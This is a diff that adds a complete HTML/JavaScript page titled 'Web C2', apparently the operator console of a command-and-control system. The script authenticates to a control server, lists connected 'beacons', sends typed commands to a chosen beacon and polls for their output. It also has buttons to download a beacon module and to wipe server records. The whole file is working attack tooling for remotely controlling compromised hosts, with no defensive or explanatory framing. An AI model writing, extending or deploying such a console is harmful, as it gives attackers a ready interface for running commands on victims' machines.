@@ -1,0 +1,290 @@
+<html>
+<head>
+	<title>Web C2</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">
+	<style>
+		body {
+			margin: 5;
+			padding: 5;
+			overflow-x: hidden;
+		}
+	</style>
+
+	<script src="settings.js"></script>
+	<!--<script src="base64.js"></script>-->
+	<script>
+		var app = {
+			auth: null,
+			noAuth: true,
+			server: settings.getServer(),
+			queue: [],
+			resolved: [],
+			tids: [],
+			createClientList: true,
+			clientList: [],
+			ini:function(){
+				document.getElementById('command').onkeypress = function(){app.checkForSubmit(event)};
+				app.getBeacons();
+				setInterval("app.getAllBeaconData();", 5 * 1000);
+				document.getElementById("command").focus();
+			},
+			makeParamString:function(args){
+				var data = "?";
+				
+				for (var key in args){
+					//console.log(args[key])
+					if (args[key]){
+						data += key + "=" + btoa(args[key]) + "&";
+						//data += key + "=" + Base64.encode(args[key]) + "&";
+					}
+				}
+
+				return data.substring(0, data.length - 1);
+			},
+			checkConnection:function(data){
+				var ele = document.getElementById("connection");
+				if (data === "Unauthorized"){
+					ele.innerHTML = "<b>Connected - Authentication Failed</b>";
+					ele.style.color = "#cc0000";
+					document.getElementById('command').type = 'password';
+					app.noAuth = true;
+					console.log("\tUnauthorized");
+					return false;
+				} else if (data){
+					ele.innerHTML = "<b>Connected to control server</b>";
+					ele.style.color = "#00cc00";
+					document.getElementById('command').type = 'textarea';
+					app.noAuth = false;
+					return true;
+				} else {
+					ele.innerHTML = "<b>Disconnected from control server</b>";
+					ele.style.color = "#cc0000";
+					console.log("Disconnected");
+					return false;
+				}
+			},
+			getAllBeaconData:function(){
+				for (client in app.clientList){
+					app.getBeaconData(app.clientList[client]);
+				}
+			},	
+			getBeaconData:function(beacon){
+				var params = app.makeParamString({beacon: beacon, auth: app.auth});
+				app.sendRequest(app.server + "readBeacon" + params, function(data){app.getBeaconDataCB(data)});
+			},
+			getBeaconDataCB:function(data, beacon){
+				if (!app.checkConnection(data)){
+					return;
+				}
+
+				var ele = document.getElementById("results");
+				var data = JSON.parse(data);
+				console.log(data);
+
+				for (item in data){
+					var entry = data[item];
+					//console.log(entry);
+
+					var validTID = app.arrHas(entry.tid, app.tids);
+
+					if (validTID >= 0){
+						var inQueue = app.arrHas(entry.tid, app.queue, "tid");
+
+						if (inQueue >= 0){
+							app.queue.splice(inQueue, 1);
+						}
+					}
+
+					if (entry.response && entry.response.length){
+						var set = entry.response.split('\n');
+						var cmd = set.shift();
+						entry.response = set.join('\n');
+						//console.log(entry);
+						document.getElementById("results").value = entry.response;
+						app.resolved.push(entry);
+					}
+				}
+
+				var ele = document.getElementById("queue");
+				app.buildList(ele, app.queue);
+
+				var ele = document.getElementById("resolved");
+				app.buildList(ele, app.resolved);
+			},
+			downloadBeacon:function(){
+				var params = app.makeParamString({auth: app.auth});
+				console.log(app.server + "downloadBeacon" + params)
+				window.open(app.server + "downloadBeacon" + params);
+				//app.sendRequest(app.server + "downloadBeacon" + params, function(data){app.downloadBeaconCB(data)});
+			},
+			clearRecords:function(){
+				if (confirm("This will erase all data on the server. You will lose control of the beacons until they checkin with the server")){
+					var params = app.makeParamString({auth: app.auth});
+					app.sendRequest(app.server + "clearRecords" + params, function(data){app.clearRecordsCB(data)});
+				}
+			},
+			clearRecordsCB:function(data){
+				if (!app.checkConnection(data)){
+					return;
+				}
+				alert('Server Record Data Cleared.\nThe page will now reload.');
+				location.reload();
+			},
+			taskBeacon:function(beacon, command, tid){
+				var params = app.makeParamString({beacon: beacon, command:command, tid:tid, auth:app.auth});
+				app.sendRequest(app.server + "taskBeacon" + params, function(data){app.taskBeaconCB(data)});
+			},
+			taskBeaconCB:function(data){
+				if (!app.checkConnection(data)){
+					return;
+				}
+				console.log(data);
+			},
+			getBeacons:function(){
+				var params = app.makeParamString({auth:app.auth});
+				app.sendRequest(app.server + "getBeaconList" + params, function(data){app.getBeaconsCB(data)});
+			},
+			getBeaconsCB:function(data){
+				if (!app.checkConnection(data)){
+					return;
+				}
+				var data = JSON.parse(data);
+				console.log(data);
+				var ele = document.getElementById("clid");
+				app.clientList = [];
+				ele.innerHTML = "";
+
+				for (host in data){
+					app.clientList.push(data[host]);
+					app.createOption(ele, data[host], data[host]);
+				}
+			},
+			sendRequest:function(url, callback){
+				var xmlhttp = new XMLHttpRequest();
+				console.log("Request: " + url);
+				xmlhttp.onreadystatechange = function(){
+					if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+						callback(xmlhttp.responseText);
+					} else if (xmlhttp.readyState == 4){
+						callback(null);
+					}
+				}
+				
+				xmlhttp.open("GET", url, true);
+				xmlhttp.send();
+			},
+			createOption:function(ele, value, text){
+				var opt = document.createElement('option');
+				opt.value = value;
+				opt.innerHTML = text;
+				ele.appendChild(opt);
+			},
+			removeOption:function(ele, value){
+				for (var i = 0; i < ele.length; i++){
+					if (ele.options[i].value == value){
+						ele.remove(i);
+					}
+				}
+			},
+			checkForSubmit:function(e){
+				var key = e.charCode ? e.charCode : e.keyCode ? e.keyCode : 0;
+				if (key == 13) {
+					e.preventDefault();
+					app.postIfValid();
+				}
+			},
+			postIfValid:function(){
+				var command = document.getElementById('command').value;
+				var beacon = document.getElementById('clid').value;
+				var tid = (9e35 * Math.random()).toString(36).slice(0, 10);
+
+
+				if (app.noAuth){
+					app.auth = command;
+					document.getElementById('command').value = '';
+					app.getBeacons();
+					return;
+				}
+
+
+				if (command && beacon){
+					app.taskBeacon(beacon, command, tid);
+					app.queue.push({beacon:beacon, command:command, tid:tid});
+					app.tids.push(tid);
+
+					var ele = document.getElementById("queue");
+					app.buildList(ele, app.queue);
+					document.getElementById('command').value = '';
+				}
+			},
+			buildList:function(ele, list){
+				ele.innerHTML = "";
+				for (item in list){
+					var data = list[item];
+					app.createOption(ele, "a" + data.tid, "[" + data.beacon + "] " + data.command);
+				}
+			},
+			arrHas:function(val, arr, prop){
+				for (item in arr){
+					if (arr[item] === val){
+						return item;
+					}
+					if (prop && arr[item][prop] === val){
+						return item;
+					}
+				}
+
+				return -1;
+			},
+			showResponse:function(tid){
+				tid = tid.substr(1, tid.length);
+				var inResolved = app.arrHas(tid, app.resolved, "tid");
+
+				if (inResolved >= 0){
+					document.getElementById("results").value = app.resolved[inResolved].response;
+				}
+			}
+		}
+	</script>
+	
+</head>
+<body onload="app.ini()">
+
+	<div class="row">
+		<div class="col-xs-3"><h1 class="text-center">Queued</h1></div>
+		<div class="col-xs-6"><h1 class="text-center">Output</h1></div>
+		<div class="col-xs-3"><h1 class="text-center">Responses</h1></div>
+	</div>
+	<div class="row">
+		<div class="col-xs-3">
+			<select class="form-control" size=23 id="queue"></select>
+		</div>
+		<div class="col-xs-6"><textarea class="form-control" style="height:400;cursor:default;" id="results" readonly></textarea></div>
+		<div class="col-xs-3">
+			<select class="form-control" size=23 id="resolved" onchange="app.showResponse(this.value)"></select>
+		</div>
+	</div>
+	<div class="row">
+		<div class="col-xs-3" id="connection" style="text-align:center;"></div>
+		<div class="col-xs-6">
+			<input type="hidden" id="uid" name="uid">
+			<input type="textarea" class="form-control" id="command" name="command">
+			Beacon: <select id="clid"></select>
+
+		</div>
+		<div class="col-xs-3" style="text-align:center;">
+			<input type="button" value="Refresh Clients" onclick="app.getBeacons();" class="btn btn-default">
+			<input type="button" value="Clear Server Records" onclick="app.clearRecords()"  class="btn btn-default">
+			<input type="button" value="Download Beacon Module" onclick="app.downloadBeacon()"  class="btn btn-default">
+		</div>
+	</div>
+
+	<span style="font-size:10px;color:#c0c0c0;" id="credits">
+		<center>
+			Created by 2Lt Gavin Delphia - 2015
+		</center>
+	</span>
+
+</body>
+</html>
